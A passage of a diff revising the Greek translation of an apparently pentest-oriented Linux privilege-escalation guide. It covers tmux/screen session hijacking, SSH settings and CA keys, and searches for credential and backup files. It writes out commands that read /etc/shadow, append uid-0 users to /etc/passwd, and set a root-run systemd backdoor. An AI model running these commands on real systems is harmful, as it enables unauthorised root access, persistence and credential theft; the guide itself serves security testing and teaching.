εισόδου/εκτέλεσης εντολών και ότι το shell της συνεδρίας εκτελείται ως ο προνομιούχος ιδιοκτήτης.
 
 ### screen sessions hijacking
 
-**Λίστα screen sessions**
+**Λίστα συνεδριών screen**
+
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
@@ -1664,27 +1920,33 @@ screen -ls <username>/ # Show another user' screen sessions
 # Socket locations (some systems expose one as symlink of the other)
 ls /run/screen/ /var/run/screen/ 2>/dev/null
 ```
-![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
 
-**Σύνδεση σε μια session**
+![Παραβίαση συνεδριών screen - Τοποθεσίες socket (σε ορισμένα συστήματα, το ένα είναι symlink του άλλου): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
+
+**Σύνδεση σε μια συνεδρία**
+
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
 screen -x [user]/[session id]
 ```
-## Παραβίαση tmux sessions
 
-Αυτό αποτελούσε πρόβλημα σε **παλαιότερες εκδόσεις του tmux**. Δεν κατάφερα να παραβιάσω ένα tmux session (v2.1) που είχε δημιουργηθεί από τον root ως μη προνομιούχος χρήστης.
+## tmux session hijacking
 
-**Καταχώριση tmux sessions**
+Αυτό ήταν πρόβλημα σε **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να κάνω hijack μια συνεδρία tmux (v2.1) που είχε δημιουργηθεί από τον root, ως μη προνομιούχος χρήστης.
+
+**Λίστα συνεδριών tmux**
+
 ```bash
 tmux ls
 ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
 tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
 ```
-![Socket locations (ορισμένα συστήματα εκθέτουν το ένα ως symlink του άλλου) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Λίστα χρησιμοποιώντας αυτό το socket, μπορείτε να εκκινήσετε ένα tmux session σε αυτό το socket...](<../../images/image (837).png>)
 
-**Σύνδεση σε ένα session**
+![Τοποθεσίες socket (ορισμένα συστήματα εκθέτουν το ένα ως symlink του άλλου) - παραβίαση συνεδριών tmux: tmux -S /tmp/dev sess ls Εμφάνιση λίστας χρησιμοποιώντας αυτό το socket· μπορείτε να ξεκινήσετε μια συνεδρία tmux σε αυτό το socket...](<../../images/image (837).png>)
+
+**Σύνδεση σε μια συνεδρία**
+
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
 tmux attach -d -t myname #First detach the session from the other console and then access it yourself
@@ -1694,61 +1956,71 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
+
 Ελέγξτε το **Valentine box from HTB** για ένα παράδειγμα.
 
 ## SSH
 
-### Debian OpenSSL Predictable PRNG - CVE-2008-0166
+### Προβλέψιμο PRNG του Debian OpenSSL - CVE-2008-0166
 
-Όλα τα SSL και SSH keys που δημιουργήθηκαν σε Debian based systems (Ubuntu, Kubuntu κ.λπ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να επηρεάζονται από αυτό το bug.\
-Αυτό το bug προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **ήταν δυνατές μόνο 32.768 παραλλαγές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+Τα κλειδιά που δημιουργήθηκαν με επηρεαζόμενες εκδόσεις του OpenSSL στο Debian ή σε παράγωγές του κατά την ιστορική περίοδο ευπάθειας ενδέχεται να έχουν προβλέψιμη τυχαιότητα· η τρέχουσα διανομή του host ή η διορθωμένη έκδοση του OpenSSL δεν αποδεικνύει πώς δημιουργήθηκε ένα παλαιότερο κλειδί. Ελέγξτε το **συγκεκριμένο κλειδί** σε κατάλληλη ιστορική blacklist και επαληθεύστε την προέλευσή του. Το εγχειρίδιο του Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) περιγράφει τον έλεγχο δημόσιων κλειδιών και του `authorized_keys`, ενώ το [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) καταγράφει τη διόρθωση του OpenSSL. Μια εγγραφή στο `authorized_keys` ενός προνομιούχου λογαριασμού αποτελεί πιθανό στοιχείο κλιμάκωσης μόνο αν μπορεί να ανακτηθεί το αντίστοιχο ιδιωτικό κλειδί και η ισχύουσα πολιτική SSH εξακολουθεί να αποδέχεται αυτό το κλειδί για τον συγκεκριμένο λογαριασμό· ένα αδύναμο **host key** δεν αποτελεί από μόνο του διαπιστευτήριο σύνδεσης. Αντικαταστήστε τα παραβιασμένα κλειδιά και αφαιρέστε τις παλιές εξουσιοδοτήσεις τους.
 
-### Ενδιαφέρουσες τιμές configuration του SSH
+### Ενδιαφέρουσες τιμές ρύθμισης SSH
 
-- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται authentication με password. Η προεπιλογή είναι `no`.
-- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται authentication με public key. Η προεπιλογή είναι `yes`.
-- **PermitEmptyPasswords**: Όταν επιτρέπεται authentication με password, καθορίζει αν ο server επιτρέπει login σε accounts με κενές συμβολοσειρές password. Η προεπιλογή είναι `no`.
+- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης. Η προεπιλογή του upstream OpenSSH είναι `yes`· η ρύθμιση της διανομής μπορεί να την παρακάμψει.
+- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
+- **PermitEmptyPasswords**: Όταν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης, καθορίζει αν ο server επιτρέπει τη σύνδεση σε λογαριασμούς με κενό κωδικό πρόσβασης. Η προεπιλογή είναι `no`.
 
-### Αρχεία ελέγχου login
+### Αρχεία ελέγχου σύνδεσης
 
-Αυτά τα αρχεία επηρεάζουν ποιοι μπορούν να κάνουν login και με ποιον τρόπο:
+Αυτά τα αρχεία επηρεάζουν ποιος μπορεί να συνδεθεί και με ποιον τρόπο:
 
-- **`/etc/nologin`**: αν υπάρχει, αποκλείει τα login μη-root χρηστών και εμφανίζει το μήνυμά του.
-- **`/etc/securetty`**: περιορίζει από πού μπορεί να κάνει login ο root (TTY allowlist).
-- **`/etc/motd`**: banner μετά το login (μπορεί να leak πληροφορίες για το environment ή λεπτομέρειες συντήρησης).
+- **`/etc/nologin`**: αν υπάρχει, αποκλείει τις συνδέσεις μη-root χρηστών και εμφανίζει το μήνυμά του.
+- **`/etc/securetty`**: περιορίζει από πού μπορεί να συνδεθεί ο root (allowlist TTY).
+- **`/etc/motd`**: banner μετά τη σύνδεση (μπορεί να διαρρεύσει πληροφορίες για το περιβάλλον ή τη συντήρηση).
 
 ### PermitRootLogin
 
-Καθορίζει αν ο root μπορεί να κάνει login χρησιμοποιώντας ssh· η προεπιλογή είναι `no`. Οι πιθανές τιμές είναι:
+Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh. Η προεπιλογή του upstream OpenSSH είναι `prohibit-password`· η ρύθμιση της διανομής μπορεί να την παρακάμψει. Πιθανές τιμές:
 
-- `yes`: ο root μπορεί να κάνει login χρησιμοποιώντας password και private key
-- `without-password` ή `prohibit-password`: ο root μπορεί να κάνει login μόνο με private key
-- `forced-commands-only`: ο root μπορεί να κάνει login μόνο χρησιμοποιώντας private key και εφόσον έχουν καθοριστεί οι command options
-- `no` : κανένα
+- `yes`: ο root μπορεί να συνδεθεί με κωδικό πρόσβασης και ιδιωτικό κλειδί
+- `without-password` ή `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
+- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί και εφόσον έχουν καθοριστεί οι επιλογές commands
+- `no` : όχι
+
+### Αξιόπιστες αρχές έκδοσης πιστοποιητικών χρηστών SSH
+
+Το `TrustedUserCAKeys` ορίζει τα δημόσια κλειδιά που εμπιστεύεται το sshd για την υπογραφή πιστοποιητικών **χρηστών**. Αν το αντίστοιχο ιδιωτικό κλειδί CA είναι αναγνώσιμο από χρήστη με χαμηλότερα προνόμια, εξετάστε ποιος μπορεί να λάβει πιστοποιητικό και με ποια principals λογαριασμών θα μπορούσε να ταυτοποιηθεί. Τα `AuthorizedPrincipalsFile` ή `AuthorizedPrincipalsCommand` μπορούν να περιορίσουν τα αποδεκτά ονόματα· αν δεν έχει ρυθμιστεί κανένα από τα δύο, το πιστοποιητικό πρέπει να περιέχει το όνομα του λογαριασμού-στόχου. Το `PermitRootLogin prohibit-password` αποκλείει την ταυτοποίηση του root με κωδικό πρόσβασης, αλλά μπορεί να επιτρέπει την ταυτοποίηση με πιστοποιητικό. Η έκθεση μιας διαδρομής κλειδιού από μόνη της δεν αποδεικνύει πρόσβαση: επιβεβαιώστε το ζεύγος δημόσιου/ιδιωτικού κλειδιού, τους ισχύοντες κανόνες `Match`, την πολιτική του λογαριασμού, τη φράση πρόσβασης του κλειδιού, την ανάκληση και τους αποδεκτούς αλγόριθμους υπογραφής. Μην συμπεριλαμβάνετε bytes ιδιωτικού κλειδιού στα αποτελέσματα enumeration. Δείτε το [εγχειρίδιο ρυθμίσεων του server OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).
+
+Ένα ιδιωτικό κλειδί CA μπορεί επίσης να χρησιμοποιηθεί **χωρίς να είναι αναγνώσιμο** από τον τρέχοντα χρήστη, αν ένας κανόνας ανάθεσης προνομίων επιτρέπει στον χρήστη να εκτελεί έναν μη περιορισμένο [signer πιστοποιητικών, όπως το `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) με την ταυτότητα του κατόχου του κλειδιού. Συσχετίστε την ακριβή επιτρεπόμενη εντολή και τα ορίσματά της με την πρόσβαση του λογαριασμού signer στο κλειδί, τη δημόσια CA που εμπιστεύεται η ισχύουσα ρύθμιση του sshd, το principal που γίνεται αποδεκτό για τον λογαριασμό-στόχο, την ισχύ του πιστοποιητικού και την πολιτική σύνδεσης αυτού του λογαριασμού. Μια εντολή signer που έχει ανατεθεί ή ένα αρχείο έμπιστης CA από μόνο του δεν αποδεικνύει πρόσβαση σε άλλον λογαριασμό· μην υπογράφετε δοκιμαστικό πιστοποιητικό κατά την παθητική διερεύνηση.
 
 ### AuthorizedKeysFile
 
-Καθορίζει αρχεία που περιέχουν τα public keys τα οποία μπορούν να χρησιμοποιηθούν για authentication χρηστών. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από το home directory. **Μπορείτε να δηλώσετε absolute paths** (που ξεκινούν με `/`) ή **relative paths από το home directory του χρήστη**. Για παράδειγμα:
+Καθορίζει τα αρχεία που περιέχουν τα δημόσια κλειδιά τα οποία μπορούν να χρησιμοποιηθούν για την ταυτοποίηση χρηστών. Μπορεί να περιέχει tokens όπως το `%h`, το οποίο αντικαθίσταται από τον home directory. **Μπορείτε να ορίσετε απόλυτες διαδρομές** (που αρχίζουν με `/`) ή **σχετικές διαδρομές από τον home directory του χρήστη**. Για παράδειγμα:
+
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
-Αυτή η ρύθμιση υποδεικνύει ότι, αν προσπαθήσετε να συνδεθείτε χρησιμοποιώντας το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του key σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`
+
+Αυτή η ρύθμιση υποδεικνύει ότι, αν προσπαθήσεις να συνδεθείς με το **ιδιωτικό** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το δημόσιο κλειδί σου με εκείνα που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`
 
 ### ForwardAgent/AllowAgentForwarding
 
-Το SSH agent forwarding σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά SSH keys σας αντί να αφήνετε keys** (χωρίς passphrases!) αποθηκευμένα στον server σας. Έτσι, θα μπορείτε να κάνετε **jump** μέσω ssh **σε έναν host** και από εκεί να κάνετε **jump σε άλλον** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό host** σας.
+Το SSH agent forwarding σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά σας κλειδιά SSH αντί να αφήνετε κλειδιά** (χωρίς passphrases!) στον server σας. Έτσι, θα μπορείτε να κάνετε **jump** μέσω ssh **σε έναν host** και από εκεί να κάνετε **jump σε άλλον** host **χρησιμοποιώντας** το **κλειδί** που βρίσκεται στον **αρχικό host** σας.
 
-Πρέπει να ορίσετε αυτήν την επιλογή στο `$HOME/.ssh.config` ως εξής:
+Πρέπει να ορίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
+
 ```
 Host example.com
-ForwardAgent yes
+  ForwardAgent yes
 ```
-Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης συνδέεται σε διαφορετικό μηχάνημα, αυτός ο host θα μπορεί να έχει πρόσβαση στα keys (κάτι που αποτελεί ζήτημα ασφάλειας).
 
-Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **options** και να επιτρέψει ή να απαγορεύσει αυτήν τη ρύθμιση.\
-Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** το ssh-agent forwarding με το keyword `AllowAgentForwarding` (η προεπιλογή είναι η επιτρεπτή λειτουργία).
+Παρατηρήστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης συνδέεται σε διαφορετικό μηχάνημα, αυτός ο host θα έχει πρόσβαση στα keys (κάτι που αποτελεί ζήτημα ασφάλειας).
 
-Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να το εκμεταλλευτείτε για privilege escalation**:
+Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτήν τη ρύθμιση.\
+Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι να επιτρέπεται).
+
+Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε κάποιο περιβάλλον, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να το καταχραστείτε για να κλιμακώσετε τα δικαιώματά σας**:
 
 
 {{#ref}}
@@ -1757,71 +2029,90 @@ ForwardAgent yes
 
 ## Ενδιαφέροντα αρχεία
 
-### Αρχεία προφίλ
+### Αρχεία Profiles
 
-Το αρχείο `/etc/profile` και τα αρχεία μέσα στο `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κάνετε privilege escalation**.
+Το αρχείο `/etc/profile` και τα αρχεία στον κατάλογο `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κλιμακώσετε τα δικαιώματά σας**.
+
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-Αν βρεθεί κάποιο περίεργο script προφίλ, θα πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.
+
+Αν εντοπιστεί κάποιο περίεργο script προφίλ, θα πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.
 
 ### Αρχεία Passwd/Shadow
 
-Ανάλογα με το OS, τα αρχεία `/etc/passwd` και `/etc/shadow` ενδέχεται να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως, συνιστάται να **βρείτε όλα** αυτά τα αρχεία και να **ελέγξετε αν μπορείτε να τα διαβάσετε**, για να δείτε **αν περιέχουν hashes**:
+Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει κάποιο αντίγραφο ασφαλείας. Επομένως, συνιστάται να **τα εντοπίσετε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε**, για να δείτε **αν περιέχουν hashes**:
+
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-Σε ορισμένες περιπτώσεις, μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή το αντίστοιχο)
+
+Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή σε αντίστοιχο αρχείο)
+
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
+
 ### Εγγράψιμο /etc/passwd
 
-Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις ακόλουθες εντολές.
+Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις παρακάτω εντολές.
+
 ```
 openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
+
 Στη συνέχεια, προσθέστε τον χρήστη `hacker` και τον κωδικό πρόσβασης που δημιουργήθηκε.
+
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-Μπορείτε πλέον να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`
+Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν dummy χρήστη χωρίς κωδικό πρόσβασης.\
-ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ενδέχεται να μειώσετε την τρέχουσα ασφάλεια του μηχανήματος.
+Τώρα μπορείς να χρησιμοποιήσεις την εντολή `su` με τα στοιχεία `hacker:hacker`
+
+Εναλλακτικά, μπορείς να χρησιμοποιήσεις τις παρακάτω γραμμές για να προσθέσεις έναν dummy χρήστη χωρίς κωδικό πρόσβασης.\
+ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να μειώσεις την τρέχουσα ασφάλεια του μηχανήματος.
+
 ```
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, ενώ το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.
 
-Θα πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;
+ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD, το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, ενώ το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.
+
+Θα πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε ορισμένα ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;
+
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Για παράδειγμα, αν το μηχάνημα εκτελεί έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο ρυθμίσεων της υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
+
+Για παράδειγμα, αν το μηχάνημα εκτελεί έναν server **tomcat** και μπορείς να **τροποποιήσεις το αρχείο διαμόρφωσης της υπηρεσίας Tomcat μέσα στο /etc/systemd/**, τότε μπορείς να τροποποιήσεις τις γραμμές:
+
 ```
 ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Το backdoor θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.
+
+Η backdoor σου θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.
 
 ### Έλεγχος φακέλων
 
-Οι παρακάτω φάκελοι ενδέχεται να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
+Οι παρακάτω φάκελοι ενδέχεται να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσεις να διαβάσεις τον τελευταίο, αλλά δοκίμασε)
+
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Παράξενη τοποθεσία/Αρχεία που ανήκουν σε χρήστες
+
+### Ασυνήθιστες τοποθεσίες/αρχεία που ανήκουν σε χρήστη
+
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1833,59 +2124,95 @@ find / -type f -user root ! -perm -o=r 2>/dev/null
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
 #Writable files by each group I belong to
 for g in `groups`;
-do printf "  Group $g:\n";
-find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
-done
+      do printf "  Group $g:\n";
+      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
+      done
 done
 ```
+
 ### Τροποποιημένα αρχεία τα τελευταία λεπτά
+
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
-### Αρχεία βάσεων δεδομένων Sqlite
+
+### Αρχεία βάσεων δεδομένων SQLite
+
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
+
+Για βάσεις δεδομένων εφαρμογών που είναι αναγνώσιμες, ελέγξτε τα ονόματα πινάκων και στηλών για usernames και password hashes. Ο εντοπισμός ενός hash, η ανάκτηση του αντίστοιχου password και η απόδειξη ότι χρησιμοποιείται ξανά για έναν τοπικό λογαριασμό είναι ξεχωριστά βήματα· μια γενική δεκαεξαδική συμβολοσειρά 32 χαρακτήρων δεν αρκεί για να συμπεράνετε ότι πρόκειται για MD5 ή ότι παρέχει πρόσβαση σε λογαριασμό.
+
 ### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
+
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
+
+Αν ένα αναγνώσιμο shell history περιέχει μια εντολή `sudo` και ακολουθείται από μια σύντομη γραμμή που μοιάζει με κωδικό πρόσβασης, ελέγξτε χειροκίνητα τις γύρω γραμμές. Ένας κωδικός πρόσβασης που πληκτρολογείται στη συνηθισμένη προτροπή του `sudo` δεν αποθηκεύεται στο shell history· μια επόμενη γραμμή είναι απλώς πιθανή τυχαία είσοδος στο shell, όχι απόδειξη έγκυρου κωδικού πρόσβασης. Ο δείκτης `.sudo_as_admin_successful` καταγράφει προηγούμενη χρήση, όχι τρέχουσα εξουσιοδότηση.
+
 ### Κρυφά αρχεία
+
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **Script/Δυαδικά αρχεία στο PATH**
+
+### **Script/Binaries στο PATH**
+
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
+
 ### **Αρχεία Web**
+
 ```bash
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
+
 ### **Αντίγραφα ασφαλείας**
+
+Επιθεωρήστε τα αναγνώσιμα αρχεία μέσα σε καταλόγους αντιγράφων ασφαλείας, καθώς και αρχεία των οποίων τα **ονόματα** περιέχουν `backup`: ένα αρχείο με αδιαφανές όνομα ή κρυπτογραφημένη επέκταση μπορεί και πάλι να εκθέτει παλιά δεδομένα εφαρμογής. Ένα κρυπτογραφημένο αρχείο αποτελεί μόνο πιθανή έκθεση. Η ανάκτηση του κωδικού πρόσβασης, η επιθεώρηση των περιεχομένων του, η ανάκτηση ενός hash εφαρμογής και η επαναχρησιμοποίηση αυτού του κωδικού για λογαριασμό Unix είναι ξεχωριστά βήματα που πρέπει να επαληθευτούν· ένα hash μέσα σε αρχείο δεν αποδεικνύει ότι είναι δυνατή η τοπική σύνδεση.
+
+Τα αναγνώσιμα αντίγραφα ασφαλείας εικονικών μηχανών απαιτούν την ίδια επιθεώρηση. Μια διαμόρφωση VirtualBox `.vbox` μπορεί να προσδιορίζει συνδεδεμένα images `.vdi` και να περιέχει μεταδεδομένα κλειδιού κρυπτογράφησης δίσκου· [η τεκμηρίωση του VirtualBox αναφέρει ότι το κλειδί δεδομένων κρυπτογράφησης αποθηκεύεται στη διαμόρφωση της VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Τόσο η διαμόρφωση όσο και το image πρέπει να είναι προσβάσιμα για να είναι δυνατή η offline επιθεώρηση του δίσκου. Ένας τόμος guest μπορεί να διαθέτει το δικό του [επίπεδο κρυπτογράφησης LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), το οποίο απαιτεί ξεχωριστό κλειδί. Ακόμη και μετά από εξουσιοδοτημένη αποκρυπτογράφηση, παλιά scripts ή αρχεία διαμόρφωσης μπορεί να περιέχουν κωδικό πρόσβασης· διαπιστώστε ότι τα διαπιστευτήρια εξακολουθούν να ισχύουν για λογαριασμό host και ότι η ενεργή πολιτική `sudo` επιτρέπει μια προνομιούχα εντολή, προτού το χαρακτηρίσετε τοπική κλιμάκωση προνομίων. Κατά την παθητική απαρίθμηση, καταγράψτε τις διαδρομές και τα δικαιώματα χωρίς να αντιγράφετε, να αποκρυπτογραφείτε ή να προσαρτάτε images.
+
+Κατά την επιθεώρηση ενός αναγνώσιμου αρχείου, πρώτα καταγράψτε τα ονόματα των μελών του και έπειτα εξαγάγετε οτιδήποτε: μπορεί να υπάρχουν κρυφά αρχεία authenticator, υλικό ανάκτησης κωδικών ή κλειδιά SSH, ακόμη κι αν τα ενεργά αντίγραφα είναι προστατευμένα. Τα ονόματα αρχείων αποτελούν μόνο ένδειξη· επαληθεύστε ξεχωριστά το υλικό και τυχόν επαναχρησιμοποίηση λογαριασμού.
+
+Δώστε προτεραιότητα στα **αναγνώσιμα αρχεία που ανήκουν σε άλλον χρήστη** και βρίσκονται σε καταλόγους αντιγράφων ασφαλείας, ιδιαίτερα σε αρχεία που ανήκουν στον root και σε όσα είναι προσβάσιμα μέσω συμμετοχής σε ομάδα. Ένα παλιό αρχείο μπορεί να περιέχει μυστικό διαμόρφωσης ή ταυτοποίησης, ακόμη κι όταν το ενεργό αντίγραφο είναι προστατευμένο. Για ένα τοπικό UI αντιγράφων ασφαλείας, όπως το [Backrest](https://garethgeorge.github.io/backrest/), ελέγξτε τον ενεργό λογαριασμό της υπηρεσίας και αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει τη διαμόρφωσή της ή να ταυτοποιηθεί στο UI. Τα [hooks](https://garethgeorge.github.io/backrest/docs/hooks) και η [διεπαφή εντολών restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) μπορούν να λειτουργούν με τα δικαιώματα αρχείων και εντολών του daemon· το ότι ένας listener ακούει μόνο στο loopback δεν καθορίζει 